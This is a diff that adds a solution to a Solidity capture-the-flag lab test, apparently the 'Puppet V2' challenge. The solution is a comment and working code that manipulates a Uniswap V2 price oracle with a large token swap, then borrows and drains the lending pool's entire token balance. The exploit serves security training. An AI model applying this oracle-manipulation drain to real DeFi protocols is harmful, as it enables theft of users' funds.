@@ -94,12 +94,39 @@ contract PuppetV2Challenge is Test {
         assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
-    function test_puppetV2() public checkSolvedByPlayer {
-        
+    /*
+        The exploit takes advantage of the fact that the lending pool calculates the required deposit based on the
+        current price of the token in the Uniswap exchange. By manipulating the price of the token
+        in the Uniswap exchange through a large token swap, the attacker can significantly reduce
+        the amount of WETH required to borrow all tokens from the lending pool. This is achieved by
+        swapping a large amount of tokens for WETH, which increases the token reserve and decreases
+        the WETH reserve in the Uniswap pool, thus lowering the token price. As a result, the attacker
+        can borrow all tokens from the lending pool by depositing a much smaller amount of WETH than would
+        normally be required, effectively draining the pool.      
+    */
+   function test_puppetV2() public checkSolvedByPlayer {
+
+        address[] memory path = new address[](2);
+        uint256 playerDVT = token.balanceOf(player);
+
+        // Swap all player's DVT for WETH
+        token.approve(address(uniswapV2Router), playerDVT);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(playerDVT, 1, path, player, block.timestamp + 1);
+
+        // Calculate the amount of WETH needed to borrow all tokens from the lending pool
+        uint256 amountToBorrow = token.balanceOf(address(lendingPool));
+        weth.deposit{value: player.balance}();
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+
+        // Borrow all tokens from the lending pool, depositing all WETH as collateral
+        lendingPool.borrow(amountToBorrow);
+
+        // Transfer all tokens to recovery address
+        token.transfer(recovery, token.balanceOf(player));
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
